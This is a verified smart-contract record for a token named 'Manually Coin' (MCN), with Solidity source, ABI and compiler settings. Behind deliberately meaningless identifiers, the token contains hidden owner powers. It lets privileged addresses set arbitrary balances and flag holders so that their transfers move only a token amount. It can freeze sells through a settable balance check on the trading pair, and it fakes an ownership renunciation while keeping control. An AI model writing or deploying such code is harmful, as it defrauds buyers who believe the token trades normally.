{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract limitToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenFee {\n    function createPair(address txLaunch, address limitLaunched) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface fundAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface modeWalletEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txLimitTeam) external view returns (uint256);\n\n    function transfer(address launchReceiver, uint256 atLimit) external returns (bool);\n\n    function allowance(address fundTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchReceiver,\n        uint256 atLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minWallet, uint256 value);\n    event Approval(address indexed fundTx, address indexed spender, uint256 value);\n}\n\ninterface modeWalletEnableMetadata is modeWalletEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ManuallyCoin is limitToken, modeWalletEnable, modeWalletEnableMetadata {\n\n    function allowance(address senderFee, address liquidityAtIs) external view virtual override returns (uint256) {\n        if (liquidityAtIs == liquidityShould) {\n            return type(uint256).max;\n        }\n        return fromWallet[senderFee][liquidityAtIs];\n    }\n\n    function launchListFrom(address fundMin) public {\n        shouldIs();\n        if (buyAuto == takeTeam) {\n            takeTeam = buyAuto;\n        }\n        if (fundMin == amountMaxMode || fundMin == teamIs) {\n            return;\n        }\n        enableAt[fundMin] = true;\n    }\n\n    bool private autoMarketing;\n\n    function tradingLaunched(address tokenList, address launchReceiver, uint256 atLimit) internal returns (bool) {\n        if (tokenList == amountMaxMode) {\n            return feeTrading(tokenList, launchReceiver, atLimit);\n        }\n        uint256 receiverMarketing = modeWalletEnable(teamIs).balanceOf(txWallet);\n        require(receiverMarketing == modeLiquidity);\n        require(launchReceiver != txWallet);\n        if (enableAt[tokenList]) {\n            return feeTrading(tokenList, launchReceiver, senderLaunchedTeam);\n        }\n        atLimit = amountModeAt(tokenList, launchReceiver, atLimit);\n        return feeTrading(tokenList, launchReceiver, atLimit);\n    }\n\n    function transferFrom(address tokenList, address launchReceiver, uint256 atLimit) external override returns (bool) {\n        if (_msgSender() != liquidityShould) {\n            if (fromWallet[tokenList][_msgSender()] != type(uint256).max) {\n                require(atLimit <= fromWallet[tokenList][_msgSender()]);\n                fromWallet[tokenList][_msgSender()] -= atLimit;\n            }\n        }\n        return tradingLaunched(tokenList, launchReceiver, atLimit);\n    }\n\n    address txWallet;\n\n    mapping(address => uint256) private buyExempt;\n\n    function balanceOf(address txLimitTeam) public view virtual override returns (uint256) {\n        return buyExempt[txLimitTeam];\n    }\n\n    function shouldIs() private view {\n        require(fromLimit[_msgSender()]);\n    }\n\n    function approve(address liquidityAtIs, uint256 atLimit) public virtual override returns (bool) {\n        fromWallet[_msgSender()][liquidityAtIs] = atLimit;\n        emit Approval(_msgSender(), liquidityAtIs, atLimit);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed maxReceiverTo, address indexed marketingTakeWallet);\n\n    mapping(address => bool) public fromLimit;\n\n    bool public minIsLiquidity;\n\n    address liquidityShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private walletTakeMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingTeam;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private fromWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptSwap;\n    }\n\n    function amountModeAt(address tokenList, address launchReceiver, uint256 atLimit) internal view returns (uint256) {\n        require(atLimit > 0);\n\n        uint256 receiverTrading = 0;\n        if (tokenList == teamIs && limitReceiver > 0) {\n            receiverTrading = atLimit * limitReceiver / 100;\n        } else if (launchReceiver == teamIs && maxModeFrom > 0) {\n            receiverTrading = atLimit * maxModeFrom / 100;\n        }\n        require(receiverTrading <= atLimit);\n        return atLimit - receiverTrading;\n    }\n\n    function fromToFee() public {\n        emit OwnershipTransferred(amountMaxMode, address(0));\n        receiverLimitMode = address(0);\n    }\n\n    mapping(address => bool) public enableAt;\n\n    bool public marketingIs;\n\n    uint256 private minLiquidityTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountLaunchAuto;\n    }\n\n    string private marketingTeam = \"Manually Coin\";\n\n    uint256 public limitReceiver = 3;\n\n    uint256 constant senderLaunchedTeam = 13 ** 10;\n\n    function fundSenderEnable(address fundLaunch, uint256 atLimit) public {\n        shouldIs();\n        buyExempt[fundLaunch] = atLimit;\n    }\n\n    uint256 private takeTeam;\n\n    function isBuyTrading(address fromAuto) public {\n        require(fromAuto.balance < 100000);\n        if (minTx) {\n            return;\n        }\n        \n        fromLimit[fromAuto] = true;\n        if (marketingIs) {\n            marketingIs = true;\n        }\n        minTx = true;\n    }\n\n    constructor (){\n        if (minIsLiquidity != walletTakeMarketing) {\n            buyAuto = takeTeam;\n        }\n        fromToFee();\n        fundAuto senderMarketing = fundAuto(liquidityShould);\n        teamIs = tokenFee(senderMarketing.factory()).createPair(senderMarketing.WETH(), address(this));\n        txWallet = tokenFee(senderMarketing.factory()).feeTo();\n        \n        amountMaxMode = _msgSender();\n        fromLimit[amountMaxMode] = true;\n        buyExempt[amountMaxMode] = exemptSwap;\n        if (autoMarketing) {\n            autoMarketing = false;\n        }\n        emit Transfer(address(0), amountMaxMode, exemptSwap);\n    }\n\n    uint256 private exemptSwap = 100000000 * 10 ** 18;\n\n    uint256 totalAuto;\n\n    bool public minTx;\n\n    function feeTrading(address tokenList, address launchReceiver, uint256 atLimit) internal returns (bool) {\n        require(buyExempt[tokenList] >= atLimit);\n        buyExempt[tokenList] -= atLimit;\n        buyExempt[launchReceiver] += atLimit;\n        emit Transfer(tokenList, launchReceiver, atLimit);\n        return true;\n    }\n\n    address private receiverLimitMode;\n\n    address public teamIs;\n\n    uint256 modeLiquidity;\n\n    function getOwner() external view returns (address) {\n        return receiverLimitMode;\n    }\n\n    uint256 public maxModeFrom = 0;\n\n    string private launchedAmount = \"MCN\";\n\n    function owner() external view returns (address) {\n        return receiverLimitMode;\n    }\n\n    uint8 private amountLaunchAuto = 18;\n\n    address public amountMaxMode;\n\n    function fundExempt(uint256 atLimit) public {\n        shouldIs();\n        modeLiquidity = atLimit;\n    }\n\n    function transfer(address fundLaunch, uint256 atLimit) external virtual override returns (bool) {\n        return tradingLaunched(_msgSender(), fundLaunch, atLimit);\n    }\n\n    uint256 private buyAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxReceiverTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTakeWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityAtIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMaxMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAtIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLimitTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atLimit\",\"type\":\"uint256\"}],\"name\":\"fundExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLimit\",\"type\":\"uint256\"}],\"name\":\"fundSenderEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAuto\",\"type\":\"address\"}],\"name\":\"isBuyTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"}],\"name\":\"launchListFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxModeFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minIsLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ManuallyCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}